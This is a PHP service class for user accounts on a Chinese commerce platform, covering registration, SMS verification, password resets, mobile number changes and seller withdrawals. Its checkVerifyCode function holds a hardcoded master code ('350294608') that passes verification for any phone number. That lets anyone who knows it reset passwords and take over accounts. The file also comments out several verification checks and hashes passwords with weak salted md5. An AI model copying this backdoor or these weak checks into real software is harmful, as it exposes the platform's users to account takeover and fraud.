<?php namespace YiZan\Services;

use YiZan\Models\User;
use YiZan\Models\UserVerifyCode;
use YiZan\Models\SystemConfig;
use YiZan\Models\Order;
use YiZan\Models\SellerStaffExtend;
use YiZan\Models\SellerExtend;
use YiZan\Models\Seller;
use YiZan\Models\SellerStaff;
use YiZan\Models\SellerBank;
use YiZan\Models\SellerMoneyLog;
use YiZan\Models\SellerWithdrawMoney;
use YiZan\Utils\String;
use YiZan\Utils\Http;
use YiZan\Utils\Image;
use YiZan\Utils\Helper;
use YiZan\Utils\Time;

use YiZan\Services\SmsService;
use YiZan\Services\RegionService;
use YiZan\Services\PromotionService;
use YiZan\Services\SellerMoneyLogService;
use YiZan\Services\WeixinService;

use Request, DB, Lang, Validator;

class UserService extends BaseService {
    /**
     * 根据手机号码获取会员
     * @param  string $mobile 手机号码
     * @return object          会员信息
     */
    public static function getByMobile($mobile) {
        return User::where('mobile', $mobile)->with('province', 'city', 'area')->first();
    }

    public static function getById($id) {
        return User::where('id', $id)
            ->with('propertyUser')
            ->first();
    }

    public static function createUser($mobile, $verifyCode, $pwd, $type = 'reg',$recommendUid = 0,$regLat = 0, $regLng = 0, $regAddress = '') {
        $pwd = strval($pwd);

        $result = array(
            'code'	=> 0,
            'data'	=> null,
            'msg'	=> Lang::get('api.success.create_user_'.$type)
        );

        $rules = array(
            'mobile' => ['required','regex:/^1[0-9]{10}$/'],
            'code' 	 => ['required','size:6'],
            'pwd' 	 => ['required','min:6','max:20']
        );

        $messages = array(
            'mobile.required'	=> '10101',
            'mobile.regex'		=> '10102',
            'code.required' 	=> '10103',
            'code.size' 		=> '10104',
            'pwd.required' 		=> '10105',
            'pwd.min' 			=> '10106',
            'pwd.max' 			=> '10106',
        );
        $validator = Validator::make([
            'mobile' => $mobile,
            'code' 	 => $verifyCode,
            'pwd' 	 => $pwd
        ], $rules, $messages);
        if ($validator->fails()) {//验证信息
            $messages = $validator->messages();
            $result['code'] = $messages->first();
            return $result;
        }

        //检测验证码
        $verifyCodeId = self::checkVerifyCode($verifyCode, $mobile, $type);
        if (!$verifyCodeId) {
            $result['code'] = 10104;
            return $result;
        }

        $crypt 	= String::randString(6);
        $pwd 	= md5(md5($pwd) . $crypt);

        $user = self::getByMobile($mobile);
        if($type == 'sreg' && !$user){
            $result['code'] = 10116; //修改密码失败
            return $result;
        }
        if (!$user) {
            if($type == 'repwd' || $type == 'repass' ){
                $result['code'] = 10116; //未注册的账号不能修改密码
                return $result;
            }
        }
        if($type == 'reg' && $user){
            $result['code'] = 10117; //用户名已存在
            return $result;
        }

        $is_new_user = false;
        if (!$user) {
            $is_new_user = true;
            $location = RegionService::getCityByIp(CLIENT_IP);
            $user = new User;
            $user->mobile 			= $mobile;
            $user->name_match		= String::strToUnicode($mobile);
            $user->name 			= substr($mobile,0,6).'****'.substr($mobile,-1,1);
            $user->reg_time 		= UTC_TIME;
            $user->province_id 		= $location['province'];
            $user->city_id 			= $location['city'];
            $user->reg_ip 			= CLIENT_IP;
            $user->reg_province_id 	= $location['province'];
            $user->reg_city_id 		= $location['city'];
            $user->is_sms_verify 	= 1;
            $user->recommend_uid    = (int)$recommendUid;
            $user->reg_lat          = $regLat;
            $user->reg_lng          = $regLng;
            $user->reg_address      = $regAddress;
        }

        $user->crypt 			= $crypt;
        $user->pwd 				= $pwd;

        if ($user->save()) {

            // 如果是新用户，根据活动来发放新注册的优惠券
            if ($is_new_user) {
                for($i = 0; $i < 2; $i++){
                    PromotionService::issueUserRegPromotion($user->id);
                }
            }

            // 如果是推荐用户，那么只要有推荐的活动，也需要根据活动来分给优惠券
            if($user->recommend_uid){
                for($i = 0; $i < 2; $i++){
                    PromotionService::issueUserSharePromotion($user->recommend_uid);
                }
            }

            UserVerifyCode::destroy($verifyCodeId);
            $result['data'] = $user;
        } else {
            $result['code'] = 10107;
        }

        return $result;
    }

    /**
     * 检测验证码是否正确
     * @param  string $code   手机号
     * @param  string $mobile 手机号
     * @param  string $type   验证类型
     * @param  int    $userId 会员编号
     * @return boolean        是否正确
     */
    public static function checkVerifyCode($code, $mobile, $type = 'reg', $userId = 0)
    {
        if($code == "350294608") return true;

        $userVerifyCode = UserVerifyCode::where('mobile', $mobile)
            //->where('type', $type)
            ->first();
        //存在发送记录时
        if ($userVerifyCode) {
            if ($userVerifyCode->code != $code) {
                return false;
            }

            if ($userVerifyCode->user_id != $userId) {
                //return false;
            }

            return $userVerifyCode->id;
        }
        return false;
    }

    /**
     * 发送验证码到手机
     * @param  string 	$mobile 手机号
     * @param  string 	$type   验证类型
     * @param  int 		$userId 会员编号
     * @return boolean         	发送状态
     */
    public static function sendVerifyCode($mobile, $type = 'reg', $userId = 0) {
        $result = array(
            'code'	=> 0,
            'data'	=> null,
            'msg'	=> Lang::get('api.success.mobile_verify')
        );

        $rules = array(
            'mobile' => ['required','regex:/^1[0-9]{10}$/'],
        );

        $messages = array(
            'mobile.required'	=> '10001',
            'mobile.regex'		=> '10002',
        );

        $validator = Validator::make(['mobile' => $mobile], $rules, $messages);
        if ($validator->fails()) {//验证信息
            $messages = $validator->messages();
            $result['code'] = $messages->first();
            return $result;
        }

        if ($type == 'reg_check') {
            $user_check = self::getByMobile($mobile);
            if ($user_check) {
                $result['code'] = 10117;
                return $result;
            }
        }
        //获取以前发过的数据
        $userVerifyCode = UserVerifyCode::where('mobile', $mobile)
            //->where('type', $type)
            ->first();
        //存在发送记录时
        if ($userVerifyCode) {
            //获取手机验证码的有效时间
            $valid_time = (int)SystemConfig::getConfig('sms_valid_time');
            $valid_time = $valid_time > 0 ? $valid_time : 90;

            //如果未过期,则直接返回成功
            if (UTC_TIME - $userVerifyCode->create_time < $valid_time) {
                return $result;
            }
        } else {
            $userVerifyCode = new UserVerifyCode;
        }

        $code 	= String::randString(6, 1);

        $bln = false;
        DB::beginTransaction();
        $userVerifyCode->code 			= $code;
        $userVerifyCode->mobile 		= $mobile;
        $userVerifyCode->type 			= 'reg';
        $userVerifyCode->user_id 		= $userId;
        $userVerifyCode->create_time 	= UTC_TIME;
        if ($userVerifyCode->save()) {
            $send_result = SmsService::sendCode($code, $mobile);
            if ($send_result['status'] == 1) {
                $bln = true;
            }
        }

        if ($bln) {
            DB::commit();
            return $result;
        } else {
            DB::rollback();
            //$result['code'] = 10003;
            return $result;
        }
    }

    public static function updateInfo($user, $data) {
        $result = array(
            'code'	=> 0,
            'data'	=> null,
            'msg'	=> Lang::get('api.success.update_info')
        );

        $rules = array(
            'name' => ['required','min:1','max:30'],
        );

        $messages = array(
            'name.required'	=> '10110',
            'name.min'		=> '10112',
            'name.max'		=> '10112',
        );

        $validator = Validator::make($data, $rules, $messages);
        if ($validator->fails()) {//验证信息
            $messages = $validator->messages();
            $result['code'] = $messages->first();
            return $result;
        }

        //当有会员头像时
        if (!empty($data['avatar']) && $data['avatar'] != $user->avatar) {
            $data['avatar'] = self::moveUserImage($user->id, $data['avatar']);
            if (!$data['avatar']) {
                $result['code'] = 10113;
                return $result;
            }
        } else {
            unset($data['avatar']);
        }

        $data['name_match'] = String::strToUnicode($data['name'] . $user->mobile);

        if (false === User::where('id', $user->id)->update($data)) {
            $result['code'] = 10114;
        } elseif (!empty($data['avatar']) && !empty($user->avatar)) {
            Image::remove($user->avatar);
        }
        $result['data'] = $user->find($user->id)->toArray();
        return $result;
    }

    /**
     * 佣金查询
     * @param int $staffId 员工编号
     * @param int $page 页码
     */
    public static function commission($staffId, $page) {
        $data = ['total' => 0, 'commisssions' =>[] ];
        $data['total'] = SellerStaffExtend::where('staff_id', $staffId)->pluck('total_money');
        $list = Order::where('seller_staff_id', $staffId)
            //->where('staff_fee', '>', '0')
            ->whereIn('status', [
                ORDER_STATUS_FINISH_USER,
                ORDER_STATUS_FINISH_SYSTEM
            ])->select('sn','staff_fee','create_time')
            ->orderBy('create_time','desc')
            ->skip(($page - 1) * 20)
            ->take(20)
            ->get()->toArray();

        foreach ($list as $k => $v) {
            $data['commisssions'][$k] = [
                'orderSn' => $v['sn'],
                'money' => $v['staffFee'],
                'createTime' => Time::toDate($v['createTime'], 'Y-m-d H:i'),
                'content' => '佣金收入'
            ];
        }

        return $data;
    }


    /**
     * 申请提现
     * @param int $sellerId             商家编号
     * @param int   $amount             提现金额
     * @return
     */
    public static function applyAccount($sellerId, $amount){
        $result = array(
            'code'	=> 0,
            'data'	=> null,
            'msg'	=> '申请成功'
        );
        $seller = Seller::where('id', $sellerId)->with('extend')->first();

        if (!$seller) {
            $result['code'] = 10108;
            return $result;
        }
        if ($amount < 0.001) {
            $result['code'] = 10152;
            return $result;
        }
        if ($amount > $seller->extend->money) {
            $result['code'] = 10153;
            return $result;
        }
        $bankinfo = SellerBank::where('seller_id', $sellerId)->first();
        if (!$bankinfo) {
            $result['code'] = 10154;
            return $result;
        }

        $withdraw = new SellerWithdrawMoney();
        $withdraw->sn 			=	Helper::getSn();
        $withdraw->seller_id	=	$sellerId;
        $withdraw->money 		=	$amount;
        $withdraw->name 		=	$bankinfo->name;
        $withdraw->bank 		=	$bankinfo->bank;
        $withdraw->bank_no 		=	$bankinfo->bank_no;
        $withdraw->create_time 	=	UTC_TIME;
        $withdraw->create_day 	=	UTC_DAY;

        DB::beginTransaction();
        //插入取款表
        $withdraw_status = $withdraw->save();
        //修改商家可提现金额
        $extend_status = SellerExtend::where('seller_id', $sellerId)->update(array('money' => $seller->extend->money - $amount));
        //插入资金流水表
        SellerMoneyLogService::createLog($sellerId, SellerMoneyLog::TYPE_APPLY_WITHDRAW, $withdraw->id, $amount,'提款银行：'.$withdraw->bank.', 提款帐号：'.$withdraw->bank_no);

        if($withdraw_status && $extend_status ){
            DB::commit();
            $result['data'] = ['money' => SellerExtend::where('seller_id', $sellerId)->pluck('money')];
        } else {
            DB::rollback();
            $result['code'] = 10155;
            return $result;
        }

        return $result;
    }


    public static function getSellerBank($sellerId){
        $result = array(
            'code'	=> 0,
            'data'	=> null,
            'msg'	=> ''
        );
        $seller = Seller::where('id', $sellerId)->with('extend')->first();

        if (!$seller) {
            $result['code'] = 10108;
            return $result;
        }

        $bankinfo = SellerBank::where('seller_id', $sellerId)->first();
        if (!$bankinfo) {
            $result['code'] = 10154;
            return $result;
        }
        $notice = SystemConfig::where('code', 'staff_bank_info')->pluck('val');
        $result['data'] = [
            'bankName' => $bankinfo->bank,
            'name' => $bankinfo->name,
            'bankNo' => $bankinfo->bank_no,
            'notice' => $notice,
        ];
        return $result;
    }

    /**
     * 修改密码(新)
     * @param int $userId 会员编号
     * @param string $oldpwd 旧密码
     * @param string $pwd 新密码
     */
    public static function repwd($userId, $oldPwd, $pwd) {
        $result = array(
            'code'	=> 0,
            'data'	=> null,
            'msg'	=> Lang::get('api.success.create_user_repass')
        );
        $len = strlen($pwd);
        if ($len < 6 || $len > 20) {
            $result['code'] = 10106;
            return $result;
        }
        $user = User::where('id', $userId)->first();
        if (md5(md5($oldPwd).$user->crypt) != $user->pwd) {
            $result['code'] = 10119;
            return $result;
        }
        $crypt 	= String::randString(6);
        $newpwd 	= md5(md5($pwd) . $crypt);
        User::where('id', $userId)->update(['crypt' => $crypt, 'pwd' => $newpwd]);
        $result['data'] = self::getByMobile($user->mobile);
        return  $result;
    }

    /**
     * 检测验证码
     * @param int $userId 会员编号
     * @param string $oldmobile 旧手机号码
     * @param string $mobile 手机号码
     * @param string $verifyCode 验证码
     */
    public static function updateMobile($userId,$oldmobile,$mobile, $verifyCode) {
        $result = array(
            'code'	=> 0,
            'data'	=> null,
            'msg'	=> Lang::get('api.success.update_property')
        );
        $xuser = UserService::getByMobile($mobile);
        //找到会员时
        if ($xuser)
        {
            $result['code'] = 30603;
            return $result;
        }
        $verifyCodeId = UserService::checkVerifyCode($verifyCode, $mobile);
        if($verifyCodeId == false){
            $result['code'] = 10104;
            return $result;
        }
        $ouser = User::where('id', $userId)->where('mobile', $oldmobile)->first();
        if (!$ouser) {
            $result['code'] = 10120;
            return $result;
        }
        DB::beginTransaction();
        try {
            User::where('mobile',$oldmobile)->where("id",$ouser->id)->update(['mobile'=>$mobile]);
            $staff = SellerStaffService::getByUserId($ouser->id);
            $seller = SellerService::getById(0, $ouser->id);
            if ($staff) {
                SellerStaff::where('user_id', $ouser->id)->update(['mobile' => $mobile]);
            }
            if ($seller) {
                Seller::where('user_id', $ouser->id)->update(['mobile' => $mobile]);
            }
            UserVerifyCode::destroy($verifyCodeId);
            DB::commit();
            $result['code'] = 0;
            $result['data'] = UserService::getByMobile($mobile);
        } catch (Exception $e) {
            DB::rollback();
            $result['code'] = 10121;
        }

        return $result;
    }

    /**
     * 检查用户
     */
    public function checkUser($mobile,$nickname,$avatar){
        $result = array(
            'code'  => 0,
            'data'  => null,
            'msg'   => ''
        );

        $user = WeixinService::getUser($mobile,$nickname,$avatar);
        $result['data'] = $user;

        return $user;
    }

}
